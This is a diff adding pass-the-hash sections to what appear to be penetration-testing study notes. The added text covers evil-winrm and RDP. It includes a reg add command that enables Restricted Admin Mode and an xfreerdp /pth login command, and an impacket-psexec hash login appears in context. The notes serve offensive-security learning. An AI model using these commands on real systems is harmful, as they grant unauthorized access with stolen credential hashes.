@@ -344,3 +344,16 @@ $ impacket-psexec <admin_user>@<target> -hashes :<hash>
 
 #### Pass the Hash with CrackMapExec
 ![[CrackMapExec#Password Spraying a domain using Pass-the-Hash]]
+
+#### Pass the Hash with evil-winrm
+![[Evil-Winrm#Pass-the-Hash]]
+
+#### PtH via RDP (Linux)
+Under certain circumstances, PtH can be achieved via RDP to gain GUI access using a tool like [[xfreerdp]].
+- `Restricted Admin Mode` must be enabled (*disabled by default*) on the target host.
+	- The `DisableRestrictedAdmin` (*REG_DWORD*) key can be added to the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value 0.
+	- `C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
+Once enabled, we can use [[xfreerdp]] and the `/pth` option to gain access
+```sh
+$ xfreerdp /v:[target_ip] /u:[user] /pth:[hash]
+```
